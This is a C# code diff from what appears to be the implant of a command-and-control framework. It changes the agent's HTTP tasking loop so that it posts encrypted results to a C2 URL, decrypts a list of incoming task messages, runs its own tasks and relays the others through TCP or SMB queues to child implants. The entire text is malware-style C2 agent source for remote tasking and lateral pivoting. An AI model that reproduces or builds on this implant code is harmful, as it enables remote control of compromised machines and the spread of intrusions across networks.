@@ -131,17 +131,41 @@ namespace Engineer.Models
 				var Encryptedoutbound = Encryption.AES_Encrypt(outbound,Program.UniqueTaskKey); // encrypt the byte array
                 //turn the encrypted byte array into HttpContent
                 var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
-                Console.WriteLine($"{DateTime.Now} posting http Task Response");
+                //Console.WriteLine($"{DateTime.Now} posting http Task Response");
                 var response = await _client.PostAsync(url, EncryptedoutboundContent);
                 var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
 				if (EncresponseContent.Length > 0) //if response is NOT null, empty, or white space then decrypt and handle it
 				{
                     //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
                     var decMessage = Encryption.AES_Decrypt(EncresponseContent, Program.MessagePathKey);
-                    var encTask = decMessage.ProDeserialize<C2TaskMessage>();
+                    var C2MessageList = decMessage.ProDeserialize<List<C2TaskMessage>>();
                     //Console.WriteLine("C2TaskMessage deserialized");
-                    var decTask = Encryption.AES_Decrypt(encTask.TaskData,Program.UniqueTaskKey);
-                    HandleResponse(decTask);
+                    foreach (C2TaskMessage taskMessage in C2MessageList)
+                    {
+                        if (taskMessage.PathMessage.Count() == 1)
+                        {
+                            var decTask = Encryption.AES_Decrypt(taskMessage.TaskData, Program.UniqueTaskKey);
+                            HandleResponse(decTask);
+                        }
+                        else
+                        {
+                            //read the path and see if it is a child engineer and forward it on.
+                            taskMessage.PathMessage.RemoveAt(0);
+                            string dest = taskMessage.PathMessage[0];
+                            Console.WriteLine($"{DateTime.Now} got task for child {dest}");
+                            var serializedTaskMessage = taskMessage.ProSerialise();
+                            var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage, Program.MessagePathKey);
+                            if (EngTCPComm.ParentToChildData.Count > 0)
+                            {
+                                EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+                            }
+                            else if (EngSMBComm.ParentToChildData.Count > 0)
+                            {
+                                EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
+                            }
+                        }
+
+                    }
 				}
 			}
             catch (Exception e)
